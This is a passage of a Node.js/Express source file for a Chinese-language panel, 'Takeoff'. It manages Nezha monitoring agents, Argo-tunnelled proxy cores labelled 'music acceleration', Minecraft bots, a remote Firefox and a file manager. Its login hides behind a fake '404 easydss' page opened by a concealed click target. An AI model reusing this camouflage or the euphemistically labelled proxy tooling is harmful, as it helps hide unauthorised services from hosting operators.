        if (nodeProcesses.has(node.id)) {
            try { nodeProcesses.get(node.id).kill(); } catch(e) {}
            nodeProcesses.delete(node.id);
        }
        savedNodes = savedNodes.filter(function(n) { return n.id !== req.params.id; });
        saveSavedNodes();
        res.json({ success: true });
    } catch(e) { res.status(500).json({ success: false, msg: e.message }); }
});
app.post("/api/nodes/:id/start", async function(req, res) {
    try {
        var node = savedNodes.find(function(n) { return n.id === req.params.id; });
        if (!node) return res.status(404).json({ success: false, msg: "节点不存在" });
        node.status = "running";
        pushNodeLog('🚀 启动节点: ' + node.name + ' (' + node.type + '/' + node.mode + ')', 'text-emerald-400');
        if (node.type === 'music' || node.type === 'nezha') {
            if (node.mode === 'laowang' && node.server && node.key) {
                nezhaConfig.addr = node.server;
                nezhaConfig.key = node.key;
                nezhaConfig.tls = node.server.includes(':443');
                nezhaConfig.mode = 'laowang';
                try { await saveNezhaConfig(); } catch(e) {}
                try { await startNezha(node.server, node.key, nezhaConfig.tls); } catch(e) {
                    pushNodeLog('❌ 老王模式启动失败: ' + e.message, 'text-red-400');
                    node.status = "error"; saveSavedNodes(); res.json({ success: false, msg: e.message }); return;
                }
                pushNodeLog('✅ 老王模式探针已启动', 'text-emerald-400');
            } else if (node.server && node.key) {
                try { await startNezhaPure(node.server, node.key, node.server.includes(':443')); } catch(e) {
                    pushNodeLog('❌ 纯Node探针启动失败: ' + e.message, 'text-red-400');
                    node.status = "error"; saveSavedNodes(); res.json({ success: false, msg: e.message }); return;
                }
                pushNodeLog('✅ 纯Node探针已启动', 'text-emerald-400');
            }
            if (node.argod) {
                var mp = {
                    NEZHA_SERVER: nezhaConfig.addr || node.server,
                    NEZHA_KEY: nezhaConfig.key || node.key,
                    ARGO_DOMAIN: node.argod,
                    ARGO_AUTH: node.argoa || '',
                    ARGO_PORT: '8001'
                };
                try { await startMusicCore(mp, false); } catch(e) {
                    pushNodeLog('⚠️ 音乐加速启动: ' + e.message, 'text-yellow-400');
                }
            }
        } else {
            pushNodeLog('ℹ️ 自定义节点: ' + JSON.stringify({ server: node.server, port: node.port, type: node.type }), 'text-cyan-400');
        }
        saveSavedNodes();
        res.json({ success: true, node: node });
    } catch(e) { res.status(500).json({ success: false, msg: e.message }); }
});
app.post("/api/nodes/:id/stop", function(req, res) {
    try {
        var node = savedNodes.find(function(n) { return n.id === req.params.id; });
        if (!node) return res.status(404).json({ success: false, msg: "节点不存在" });
        node.status = "stopped";
        pushNodeLog('⏹️ 停止节点: ' + node.name, 'text-orange-400');
        if (node.type === 'nezha' || node.type === 'music') {
            try { stopNezhaPure(); } catch(e) {}
            try { nezhaUserStopped = true; } catch(e) {}
            try { if (nezhaProcess) { nezhaProcess.kill(); } nezhaProcess = null; } catch(e) {}
            try { if (musicProcess && !musicProcess.killed) musicProcess.kill(); } catch(e) {}
            musicProcess = null;
        }
        saveSavedNodes();
        res.json({ success: true });
    } catch(e) { res.status(500).json({ success: false, msg: e.message }); }
});
app.post("/api/nodes/start-all", async function(req, res) {
    var results = [];
    for (var i = 0; i < savedNodes.length; i++) {
        var n = savedNodes[i];
        if (n.status !== 'running') {
            try {
                n.status = "running";
                if (n.type === 'music' || n.type === 'nezha') {
                    if (n.server && n.key) {
                        nezhaConfig.addr = n.server; nezhaConfig.key = n.key;
                        nezhaConfig.tls = n.server.includes(':443'); nezhaConfig.mode = n.mode || 'pure';
                        try { await saveNezhaConfig(); } catch(e) {}
                        if (n.mode === 'laowang') {
                            try { await startNezha(n.server, n.key, nezhaConfig.tls); } catch(e) {}
                        } else {
                            try { await startNezhaPure(n.server, n.key, nezhaConfig.tls); } catch(e) {}
                        }
                    }
                }
                results.push({ id: n.id, name: n.name, status: 'started' });
            } catch(e) { results.push({ id: n.id, name: n.name, status: 'error', msg: e.message }); }
        }
    }
    saveSavedNodes();
    res.json({ success: true, results: results });
});
app.get("/api/nodes/discover", function(req, res) {
    try {
        var disc = discoverMCServerWithPortFallback();
        res.json({ success: true, server: disc || { ip: getLocalIPv4(), port: 25565, source: 'default' }, localIP: getLocalIPv4() });
    } catch(e) {
        res.json({ success: false, error: e.message, localIP: getLocalIPv4() });
    }
});

// ===== 前端 UI =====
app.get("/",function(req,res){
res.send(`<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title></title><link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
<script src="https://cdn.tailwindcss.com"><\/script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
body{font-family:'Inter',sans-serif;background:#030712;color:#e2e8f0;background-image:radial-gradient(at 0% 0%,rgba(16,185,129,.08) 0px,transparent 50%),radial-gradient(at 100% 0%,rgba(59,130,246,.08) 0px,transparent 50%),radial-gradient(at 100% 100%,rgba(139,92,246,.08) 0px,transparent 50%);min-height:100vh}
.glass{background:rgba(15,23,42,.6);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.08);box-shadow:0 4px 30px rgba(0,0,0,.2)}
.card-hover{transition:box-shadow .3s,border-color .3s}.card-hover:hover{box-shadow:0 8px 30px rgba(0,0,0,.4);border-color:rgba(255,255,255,.15)}
.status-dot{width:8px;height:8px;border-radius:50%;display:inline-block}.online{background:#10b981;box-shadow:0 0 8px #10b981;animation:pulse 2s infinite}.offline{background:#ef4444;box-shadow:0 0 8px #ef4444}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.input-dark{background:rgba(2,6,23,.8);border:1px solid rgba(255,255,255,.1);transition:all .2s}.input-dark:focus{border-color:#3b82f6;box-shadow:0 0 0 2px rgba(59,130,246,.3);outline:none}
.select-dark{background:rgba(2,6,23,.8);border:1px solid rgba(255,255,255,.1)}.select-dark:focus{border-color:#3b82f6;outline:none}
.btn-primary{background:linear-gradient(135deg,#3b82f6,#2563eb);box-shadow:0 4px 15px rgba(59,130,246,.3);transition:all .2s}.btn-primary:hover{box-shadow:0 6px 20px rgba(59,130,246,.5);transform:translateY(-1px)}
.btn-danger{background:linear-gradient(135deg,#ef4444,#dc2626);box-shadow:0 4px 15px rgba(239,68,68,.3);transition:all .2s}.btn-danger:hover{box-shadow:0 6px 20px rgba(239,68,68,.5);transform:translateY(-1px)}
.log-box::-webkit-scrollbar{width:4px}.log-box::-webkit-scrollbar-track{background:rgba(0,0,0,.2);border-radius:10px}.log-box::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:10px}
.toggle-btn{transition:all .2s;border:1px solid transparent}.toggle-btn:active{transform:scale(.95)}.toggle-btn.off{background:rgba(30,41,59,.8);border-color:rgba(255,255,255,.05);color:#94a3b8}.toggle-btn.off:hover{background:rgba(51,65,85,.8)}
details summary::-webkit-details-marker{display:none}
.modal-overlay{opacity:0;pointer-events:none;transition:opacity .3s}.modal-overlay.active{opacity:1;pointer-events:auto}
.modal-content{transform:scale(.95);transition:transform .3s}.modal-overlay.active .modal-content{transform:scale(1)}
.view-section{display:none}.view-section.active-view{display:block;animation:fadeIn .2s}
@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.fm-row:hover{background:rgba(255,255,255,.05)}.fm-row{transition:background .15s}[data-fm-dir]{cursor:pointer}
</style>
</head>
<body class="p-4 md:p-8 pb-24">

<div id="auth-screen" style="position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;padding:1rem;background:#fff">

<!-- 404伪装页面 模拟easydss错误 (根据浏览器语言自动切换) -->
<div id="fake-404" class="text-center select-none" style="max-width:420px">
<div id="f404-title" style="color:rgba(0,0,0,.85);font-size:16px;font-weight:600;font-family:monospace">404 Not Found</div>
<div style="color:rgba(0,0,0,.5);font-size:13px;margin-top:8px;font-family:monospace">easydss/1.13<span style="cursor:default" onclick="document.getElementById('fake-404').style.display='none';document.getElementById('real-login').style.display='flex'">.</span>0</div>
</div>

<!-- 真实登录界面 -->
<div id="real-login" style="display:none;align-items:center;justify-content:center;width:100%">
<div class="glass rounded-3xl p-8 w-full max-w-sm text-center border border-white/10 shadow-2xl">
<div class="w-16 h-16 bg-blue-500/20 rounded-2xl flex items-center justify-center text-4xl mx-auto mb-6 shadow-inner">🔐</div>
<h2 class="text-2xl font-extrabold mb-2 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">Takeoff</h2>
<p class="text-slate-500 text-xs mb-6 font-medium">请输入面板密码以继续</p>
<form onsubmit="return false"><input type="text" name="username" autocomplete="username" style="display:none" aria-hidden="true" tabindex="-1"><input id="auth-pwd" type="password" autocomplete="current-password" placeholder="输入密码" class="input-dark w-full rounded-xl px-4 py-3 text-sm text-white text-center tracking-widest mb-4"></form>
<button id="auth-btn" class="btn-primary w-full py-3 rounded-xl text-sm font-bold cursor-pointer">验 证</button>
<p id="auth-err" style="color:#f87171;font-size:12px;margin-top:12px;display:none">⚠️ 密码错误</p>
</div>
</div>

</div>

<div id="main-content" style="display:none">
<div class="max-w-7xl mx-auto">
<header class="flex flex-col md:flex-row justify-between items-center mb-10 gap-6">
<div class="flex items-center gap-6">
<div><h1 class="text-4xl font-black bg-gradient-to-r from-blue-400 via-emerald-400 to-purple-400 bg-clip-text text-transparent uppercase tracking-tighter">Takeoff</h1><p class="text-slate-500 text-sm mt-1 font-medium tracking-wide">All-in-One Panel v2025</p></div>
<div class="flex gap-2">
<button id="btn-app-center" onclick="openAppCenter()" class="glass border border-white/10 px-4 py-2 rounded-2xl text-xs font-bold text-slate-300 hover:text-white hover:border-white/20 transition-all flex items-center gap-1.5 shadow-lg cursor-pointer"><span>🚀</span> 应用中心</button>
<button id="btn-tavern" onclick="openTavern()" class="glass border border-amber-500/30 px-4 py-2 rounded-2xl text-xs font-bold text-amber-300 hover:text-white hover:border-amber-400/60 transition-all flex items-center gap-1.5 shadow-lg shadow-amber-500/10 cursor-pointer"><span>🍺</span> 酒馆任务</button>
</div>
</div>
<div class="glass p-2 rounded-2xl flex gap-2 w-full md:w-auto border border-white/10">
<input id="h" placeholder="IP:PORT" class="input-dark rounded-xl px-4 py-2.5 text-sm text-white flex-1 md:w-48">
<input id="u" placeholder="角色名" class="input-dark rounded-xl px-4 py-2.5 text-sm text-white md:w-36">
<button id="btn-add-bot" class="btn-primary text-white px-6 py-2.5 rounded-xl text-sm font-bold active:scale-95 cursor-pointer">部署角色</button>
</div>
</header><div id="list" class="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6"></div>
</div>
<div id="mem-bar" class="fixed bottom-6 right-6 p-4 glass rounded-2xl flex items-center gap-4 z-40 shadow-2xl border border-white/10"><div class="flex flex-col items-center justify-center"><span id="mem-percent" class="text-xl font-black text-white tracking-tight">0.0%</span><span class="text-[9px] font-bold text-slate-500 uppercase tracking-widest">RAM</span></div><div class="w-28 h-2 bg-slate-800 rounded-full overflow-hidden shadow-inner"><div id="mem-progress" class="h-full bg-gradient-to-r from-blue-500 to-cyan-400 transition-all duration-700 rounded-full" style="width:0%"></div></div></div>
</div>

<audio id="welcome-audio" preload="auto"><source src="https://raw.githubusercontent.com/outrzxy17145yy/-/main/welcome_voice.mp3" type="audio/mpeg"></audio>

<div id="modal-app-center" class="modal-overlay fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center p-4">
<div class="modal-content glass rounded-3xl w-full max-w-2xl border border-white/10 shadow-2xl p-8 relative max-h-[90vh] overflow-y-auto log-box">
<div id="view-list" class="view-section active-view">
<div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-extrabold tracking-tight flex items-center gap-3"><span class="text-xl">🚀</span> 应用中心</h2><button class="close-app-center text-slate-400 hover:text-white text-2xl font-bold cursor-pointer">&times;</button></div>
<div class="grid grid-cols-4 gap-3">
    <div class="nav-ff cursor-pointer glass rounded-xl p-3 border border-orange-500/20 hover:border-orange-500/60 transition-all flex flex-col items-center justify-center gap-1.5 group"><div class="w-9 h-9 bg-orange-500/20 rounded-lg flex items-center justify-center text-lg shadow-inner group-hover:scale-110 transition-transform">🦊</div><h3 class="font-bold text-[11px] text-slate-200 group-hover:text-orange-300">火狐浏览器</h3></div>
    <div class="nav-music cursor-pointer glass rounded-xl p-3 border border-purple-500/20 hover:border-purple-500/60 transition-all flex flex-col items-center justify-center gap-1.5 group"><div class="w-9 h-9 bg-purple-500/20 rounded-lg flex items-center justify-center text-lg shadow-inner group-hover:scale-110 transition-transform">🎵</div><h3 class="font-bold text-[11px] text-slate-200 group-hover:text-purple-300">音乐+探针</h3></div>
    <div class="nav-node cursor-pointer glass rounded-xl p-3 border border-cyan-500/20 hover:border-cyan-500/60 transition-all flex flex-col items-center justify-center gap-1.5 group"><div class="w-9 h-9 bg-cyan-500/20 rounded-lg flex items-center justify-center text-lg shadow-inner group-hover:scale-110 transition-transform">🌐</div><h3 class="font-bold text-[11px] text-slate-200 group-hover:text-cyan-300">节点管理</h3></div>
    <div class="nav-files cursor-pointer glass rounded-xl p-3 border border-emerald-500/20 hover:border-emerald-500/60 transition-all flex flex-col items-center justify-center gap-1.5 group"><div class="w-9 h-9 bg-emerald-500/20 rounded-lg flex items-center justify-center text-lg shadow-inner group-hover:scale-110 transition-transform">📁</div><h3 class="font-bold text-[11px] text-slate-200 group-hover:text-emerald-300">文件管理器</h3></div>
</div>
</div>
<div id="view-ff" class="view-section">
<div class="flex justify-between items-center mb-6"><div class="flex items-center gap-3"><button class="nav-list text-xl text-slate-400 hover:text-white cursor-pointer">←</button><h2 class="text-2xl font-extrabold tracking-tight flex items-center gap-3"><span class="text-xl">🦊</span> 火狐浏览器</h2></div><button class="nav-list text-slate-400 hover:text-white text-2xl font-bold cursor-pointer">&times;</button></div>
<div class="bg-black/40 rounded-2xl p-5 border border-slate-800/50 flex flex-col gap-4">
<div class="space-y-2 p-4 bg-black/20 rounded-2xl border border-slate-800/50"><p class="text-xs text-slate-400 font-bold mb-2">火狐配置</p><div class="grid grid-cols-2 gap-2"><input id="ff-argo-domain" placeholder="ARGO_DOMAIN" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><input id="ff-argo-auth" placeholder="ARGO_AUTH" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"></div><div class="grid grid-cols-2 gap-2"><input id="ff-pass" placeholder="密码 (默认 123456)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><input id="ff-port" placeholder="端口 (默认 25889)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"></div></div>
<div id="ff-url-box" class="hidden bg-cyan-500/10 border border-cyan-500/30 p-3 rounded-xl"><p class="text-[10px] text-cyan-400 font-bold mb-1">✅ 隧道就绪：</p><a id="ff-url-link" href="#" target="_blank" class="text-sm text-white font-mono underline break-all hover:text-cyan-300"></a></div>
<div class="bg-black/60 rounded-xl p-3 h-48 overflow-y-auto font-mono text-[10px] border border-white/5 shadow-inner log-box" id="ff-log-box"><div class="text-slate-500 opacity-50 text-center mt-16">等待操作...</div></div>
<div class="grid grid-cols-3 gap-2"><button id="ff-btn-start" class="toggle-btn off py-2.5 rounded-xl text-xs font-bold cursor-pointer">▶️ 启动</button><button id="ff-btn-stop" class="toggle-btn off py-2.5 rounded-xl text-xs font-bold cursor-pointer">⏸️ 暂停</button><button id="ff-btn-uninstall" class="toggle-btn off py-2.5 rounded-xl text-xs font-bold text-red-400 cursor-pointer">🗑️ 卸载</button></div>
</div>
</div>
<div id="view-music" class="view-section">
<div class="flex justify-between items-center mb-6"><div class="flex items-center gap-3"><button class="nav-list text-xl text-slate-400 hover:text-white cursor-pointer">←</button><h2 class="text-2xl font-extrabold tracking-tight flex items-center gap-3"><span class="text-xl">🎵</span> 音乐加速 & 哪吒探针</h2></div><button class="nav-list text-slate-400 hover:text-white text-2xl font-bold cursor-pointer">&times;</button></div>
<div class="bg-black/40 rounded-2xl p-5 border border-slate-800/50 flex flex-col gap-4">

<!-- 顶部状态灯: 2个模式 + 老王节点小灯 -->
<div class="grid grid-cols-2 gap-3 mb-1">
    <div class="glass rounded-xl p-4 border border-purple-500/20 flex flex-col gap-1">
        <div class="flex items-center gap-2"><span id="nz-pure-dot" class="status-dot offline shrink-0"></span><div class="text-xs text-slate-400 font-bold">纯Node.js探针</div></div>
        <div id="nz-pure-status" class="text-xs font-bold text-slate-500 ml-5">未运行</div>
    </div>
    <div class="glass rounded-xl p-4 border border-orange-500/20 flex flex-col gap-1">
        <div class="flex items-center gap-2"><span id="nz-lw-dot" class="status-dot offline shrink-0"></span><div class="text-xs text-slate-400 font-bold">老王模式</div></div>
        <div id="nz-lw-status" class="text-xs font-bold text-slate-500 ml-5">未运行</div>
        <div id="lw-node-row" class="flex items-center gap-1.5 ml-5 mt-0.5"><span id="m-node-dot" class="w-2 h-2 rounded-full shrink-0" style="background:#ef4444;box-shadow:0 0 4px #ef4444"></span><div class="text-[10px] text-slate-500">节点</div><div id="m-node-status" class="text-[10px] font-bold text-slate-500">未连接</div></div>
    </div>
</div>

<!-- 模式切换按钮 -->
<div class="flex gap-2">
    <button id="nz-pure-btn" class="flex-1 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all bg-purple-600/80 text-white border border-purple-500/30">⚡ 纯JS模式</button>
    <button id="nz-lw-btn" class="flex-1 py-2.5 rounded-xl text-xs font-bold cursor-pointer transition-all bg-slate-700/80 text-slate-400 border border-slate-600/30">🔥 老王模式</button>
</div>

<!-- 哪吒探针运行日志 -->
<div class="bg-black/60 rounded-xl p-3 h-32 overflow-y-auto font-mono text-[10px] border border-white/5 shadow-inner" id="nezha-log-box"><div class="text-slate-500 opacity-50 text-center mt-8">等待操作...</div></div>

<!-- 启动/停止按钮 -->
<div class="grid grid-cols-2 gap-2">
    <button id="btn-start" class="bg-emerald-600/80 hover:bg-emerald-600 text-white py-2.5 rounded-xl text-xs font-bold cursor-pointer">▶️ 启动</button>
    <button id="btn-stop" class="bg-orange-600/80 hover:bg-orange-600 text-white py-2.5 rounded-xl text-xs font-bold cursor-pointer">⏹️ 停止</button>
</div>

<!-- 哪吒探针配置 (根据模式切换标题) -->
<details class="group bg-black/20 rounded-2xl border border-cyan-500/10" open>
<summary class="flex justify-between items-center cursor-pointer list-none p-3"><span id="nz-config-title" class="text-[10px] font-bold text-cyan-400 uppercase tracking-wider">📡 纯Node.js探针配置</span><span class="transition group-open:rotate-180 text-slate-500 text-[10px]">▼</span></summary>
<div class="px-3 pb-3 space-y-2">
    <input id="nz-addr" placeholder="面板地址 如 nz.example.com:8008" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">
    <div class="grid grid-cols-2 gap-2"><input id="nz-key" placeholder="Agent 密钥" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><div class="flex items-center gap-2 bg-black/30 rounded-xl px-3 border border-white/5"><input id="nz-tls" type="checkbox" checked class="w-4 h-4 rounded"><span class="text-[10px] text-slate-400">TLS</span></div></div>
</div></details>

<!-- 老王模式配置区 (仅老王模式显示) -->
<div id="lw-config-section" style="display:none">
<details class="group bg-black/20 rounded-2xl border border-orange-500/10" open>
<summary class="flex justify-between items-center cursor-pointer list-none p-3"><span class="text-[10px] font-bold text-orange-400 uppercase tracking-wider">🎵 老王模式配置</span><span class="transition group-open:rotate-180 text-slate-500 text-[10px]">▼</span></summary>
<div class="px-3 pb-3 space-y-2">
    <input id="m-uuid" placeholder="UUID (自动生成)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-emerald-400 font-mono">
    <div class="grid grid-cols-2 gap-2"><input id="m-argo-domain" placeholder="ARGO_DOMAIN" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><input id="m-argo-auth" placeholder="ARGO_AUTH" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"></div>
    <div class="grid grid-cols-2 gap-2"><input id="m-argo-port" placeholder="ARGO_PORT (默认8001)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><input id="m-name" placeholder="NAME" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"></div>
</div></details>

<details class="group bg-black/20 rounded-2xl border border-slate-800/50">
<summary class="flex justify-between items-center cursor-pointer list-none p-3"><span class="text-[10px] font-bold text-slate-400 uppercase tracking-wider">📡 哪吒 & 优选 & 多端口 (可选)</span><span class="transition group-open:rotate-180 text-slate-500 text-[10px]">▼</span></summary>
<div class="px-3 pb-3 space-y-2">
    <input id="m-nezha-server" placeholder="哪吒面板地址" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">
    <div class="grid grid-cols-2 gap-2"><input id="m-nezha-key" placeholder="Agent 密钥" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><input id="m-nezha-port" placeholder="Agent 端口 (V1留空)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"></div>
    <div class="grid grid-cols-2 gap-2"><input id="m-cfip" placeholder="CF优选IP (默认skk.moe)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><input id="m-cfport" placeholder="CF端口 (默认8443)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"></div>
    <div class="grid grid-cols-3 gap-2"><input id="m-hy2-port" placeholder="HY2端口" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><input id="m-reality-port" placeholder="REALITY端口" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"><input id="m-tuic-port" placeholder="TUIC端口" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white"></div>
</div></details>
</div>

<!-- 老王模式专属区域(纯Node模式下隐藏) -->
<div id="lw-features-section" style="display:none">
<!-- 日志框 + 操作按钮 横向排列 -->
<div class="flex gap-3">
    <div class="flex-1 min-w-0">
        <div class="bg-black/60 rounded-xl p-3 h-32 overflow-y-auto font-mono text-[10px] border border-white/5 shadow-inner log-box" id="music-log-box"><div class="text-slate-500 opacity-50 text-center mt-8">等待操作...</div></div>
    </div>
    <div class="flex flex-col gap-2 w-36 shrink-0">
        <button id="btn-extract" class="bg-indigo-600/90 shadow-lg shadow-indigo-500/30 text-white py-2.5 rounded-xl text-xs font-bold cursor-pointer opacity-50 flex-1">📋 提取节点</button>
        <button id="btn-uninstall" class="bg-red-600/80 hover:bg-red-600 text-white py-2.5 rounded-xl text-xs font-bold cursor-pointer flex-1">🗑️ 卸载清空</button>
    </div>
</div>
</div>

</div>
</div>

<!-- ===== 节点管理视图 ===== -->
<div id="view-node" class="view-section">
<div class="flex justify-between items-center mb-6"><div class="flex items-center gap-3"><button class="nav-list text-xl text-slate-400 hover:text-white cursor-pointer">←</button><h2 class="text-2xl font-extrabold tracking-tight flex items-center gap-3"><span class="text-xl">🌐</span> 节点管理</h2></div><button class="nav-list text-slate-400 hover:text-white text-2xl font-bold cursor-pointer">&times;</button></div>
<div class="bg-black/40 rounded-2xl p-5 border border-cyan-500/10 flex flex-col gap-4">
<!-- 新节点配置 -->
<div class="bg-black/30 rounded-2xl p-4 border border-white/5">
<div class="text-xs font-bold text-cyan-400 uppercase tracking-wider mb-3">➕ 添加/编辑节点</div>
<div class="grid grid-cols-2 md:grid-cols-4 gap-2 mb-2">
<input id="node-type" placeholder="节点类型 (music/nezha/custom)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">
<input id="node-name" placeholder="节点名称" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">
<input id="node-server" placeholder="服务器地址 (留空=自动发现)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">
<input id="node-port" placeholder="端口 (默认自动)" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">
</div>
<div class="grid grid-cols-2 md:grid-cols-4 gap-2 mb-2">
<input id="node-key" placeholder="密钥/Key" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">
<input id="node-argod" placeholder="ARGO_DOMAIN" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">
<input id="node-argoa" placeholder="ARGO_AUTH" class="input-dark w-full rounded-xl px-3 py-2 text-xs text-white">
<select id="node-mode" class="select-dark w-full rounded-xl px-3 py-2 text-xs text-white">
<option value="pure">纯Node模式</option>
<option value="laowang">老王模式</option>
</select>
</div>
<div class="flex gap-2">
<button id="node-save" class="btn-primary flex-1 py-2.5 rounded-xl text-xs font-bold cursor-pointer">💾 保存节点</button>
<button id="node-test" class="bg-slate-700 hover:bg-slate-600 text-white py-2.5 rounded-xl text-xs font-bold cursor-pointer">🔍 测试连接</button>
<button id="node-auto" class="bg-purple-600/80 hover:bg-purple-600 text-white py-2.5 rounded-xl text-xs font-bold cursor-pointer">⚡ 一键自启</button>
</div>
</div>
<!-- 节点列表 -->
<div class="bg-black/30 rounded-2xl p-4 border border-white/5">
<div class="flex justify-between items-center mb-3">
<div class="text-xs font-bold text-cyan-400 uppercase tracking-wider">📋 已保存节点</div>
<button id="node-auto-all" class="bg-emerald-600/80 hover:bg-emerald-600 text-white px-3 py-1.5 rounded-lg text-[10px] font-bold cursor-pointer">⚡ 全启动</button>
</div>
<div id="node-list" class="space-y-2"></div>
<div id="node-empty" class="text-slate-500 opacity-50 text-center py-6 text-xs">暂无节点，点击上方「保存节点」添加</div>
</div>
<!-- 节点状态日志 -->
<div class="bg-black/60 rounded-xl p-3 h-32 overflow-y-auto font-mono text-[10px] border border-white/5 shadow-inner log-box" id="node-log-box"><div class="text-slate-500 opacity-50 text-center mt-8">等待操作...</div></div>
</div>
</div>

<div id="view-files" class="view-section">
<div class="flex justify-between items-center mb-6"><div class="flex items-center gap-3"><button class="nav-list text-xl text-slate-400 hover:text-white cursor-pointer">←</button><h2 class="text-2xl font-extrabold tracking-tight flex items-center gap-3"><span class="text-xl">📁</span> 文件管理器</h2></div><button class="nav-list text-slate-400 hover:text-white text-2xl font-bold cursor-pointer">&times;</button></div>
<div class="bg-black/40 rounded-2xl p-4 border border-slate-800/50 flex flex-col gap-3">
<div class="flex items-center gap-2 bg-black/30 rounded-xl p-3 border border-white/5 flex-wrap">
<button id="fm-btn-up1" class="text-[10px] bg-slate-700 hover:bg-slate-600 px-2.5 py-1.5 rounded-lg font-bold cursor-pointer" title="上级目录">⬆️ 上级</button>
<button id="fm-btn-up2" class="text-[10px] bg-slate-700 hover:bg-slate-600 px-2.5 py-1.5 rounded-lg font-bold cursor-pointer hidden" title="上2级目录">⬆⬆ 上2级</button>
<button id="fm-btn-up3" class="text-[10px] bg-slate-700 hover:bg-slate-600 px-2.5 py-1.5 rounded-lg font-bold cursor-pointer hidden" title="上3级目录">⬆⬆⬆ 上3级</button>
<div id="fm-breadcrumb" class="flex items-center gap-1 text-[10px] text-slate-400 flex-1 overflow-x-auto font-mono ml-2"><span class="text-white font-bold cursor-pointer hover:text-cyan-300">/</span></div>
<button id="fm-btn-refresh" class="text-[10px] bg-slate-700 hover:bg-slate-600 px-2.5 py-1.5 rounded-lg font-bold cursor-pointer">🔄</button>
</div>
<div class="flex gap-2">
<button id="fm-btn-upload" class="btn-primary px-4 py-2 rounded-xl text-xs font-bold cursor-pointer flex items-center gap-1">📤 上传</button>
<button id="fm-btn-mkdir" class="bg-slate-700 hover:bg-slate-600 px-4 py-2 rounded-xl text-xs font-bold cursor-pointer flex items-center gap-1">📁 新建目录</button>
<span id="fm-upload-status" class="text-[10px] text-slate-500 self-center hidden">上传中...</span>
<input id="fm-upload-input" type="file" multiple class="hidden">
</div>
<div id="fm-file-list" class="bg-black/60 rounded-xl border border-white/5 overflow-hidden">
<div class="grid grid-cols-[1fr_90px_120px_60px] gap-2 px-3 py-2 bg-slate-900/80 text-[9px] font-bold text-slate-500 uppercase border-b border-white/5 select-none">
<span>名称</span><span>大小</span><span>修改时间</span><span>操作</span>
</div>
<div id="fm-items" class="max-h-[48vh] overflow-y-auto log-box">
<div class="text-slate-500 opacity-50 text-center py-8 text-xs">加载中...</div>
</div>
</div>
<div class="text-[9px] text-slate-600 flex justify-between"><span id="fm-count-info">0 项</span><span>单击目录进入 | 单击文件下载</span></div>
</div>
</div>
</div>
</div>

<div id="modal-tavern" class="modal-overlay fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center p-4">
<div class="modal-content glass rounded-3xl w-full max-w-2xl border border-amber-500/20 shadow-2xl p-6 relative max-h-[90vh] overflow-hidden flex flex-col">
<div class="flex justify-between items-center mb-4"><h2 class="text-2xl font-extrabold tracking-tight flex items-center gap-3"><span class="text-xl">🍺</span> 酒馆任务</h2><div class="flex items-center gap-2"><button id="btn-add-task" class="btn-primary px-4 py-2 rounded-xl text-xs font-bold cursor-pointer">➕ 创建任务</button><button class="close-tavern text-slate-400 hover:text-white text-2xl font-bold cursor-pointer">&times;</button></div></div>
<!-- 竖向布局: 上面任务列表, 下面任务详情 -->
<div class="flex flex-col gap-4 flex-1 min-h-0 overflow-hidden">
<!-- 上面: 任务列表 -->
<div id="tavern-task-list" class="overflow-y-auto log-box space-y-2 pr-1 max-h-[30vh] shrink-0"><div class="text-center text-slate-500 text-xs py-6 opacity-50">暂无任务</div></div>
<!-- 下面: 任务详情 + 日志 -->
<div id="tavern-detail-panel" class="flex-1 bg-black/30 rounded-2xl border border-amber-500/10 flex flex-col min-h-0 overflow-hidden">
<div id="tavern-detail-title" class="px-4 py-2 border-b border-white/5 text-xs font-bold text-cyan-400 flex items-center gap-2 shrink-0"><span>📋</span> 点击上方任务查看详情</div>
<div id="tavern-detail-content" class="flex-1 overflow-y-auto log-box p-4 space-y-3">
<div class="text-slate-500 opacity-50 text-center text-xs py-8">点击上方任务查看配置与日志</div>
</div>
</div>
</div>
</div>
</div>

<!-- 创建任务弹出框 -->
